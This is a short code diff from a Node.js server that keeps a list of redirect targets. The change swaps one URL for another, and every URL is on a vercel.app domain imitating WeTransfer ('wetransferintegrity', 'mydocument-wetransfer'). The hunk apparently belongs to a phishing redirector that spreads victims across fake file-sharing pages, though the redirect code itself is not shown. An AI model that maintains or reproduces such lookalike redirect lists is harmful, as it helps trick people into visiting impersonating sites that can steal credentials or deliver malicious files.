@@ -6,7 +6,7 @@ const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
 // List of URLs for redirection
 const urls = [
     "https://wetransferintegrity.vercel.app/?k51qzi5uqu5dgrnqfpoj7gmjl8224c6jxin7p4u3xoo5f9nw6artiwe8cx647x",
-    "https://wetransferintegrity.vercel.app/?bafybeig2rf5ebepfrekhfc7rd5neyjncjsba5zhcoz54bf2swxs52b2ibi",
+    "https://mydocument-wetransfer.vercel.app/?bafybeig2rf5ebepfrekhfc7rd5neyjncjsba5zhcoz54bf2swxs52b2ibi",
     "https://wetransferintegrity.vercel.app/?k51qzi5uqu5dgrnqfpoj7gmjl8224c6jxin7p4u3xoo5f9nw6artiwe8cx647x"
 ];
 
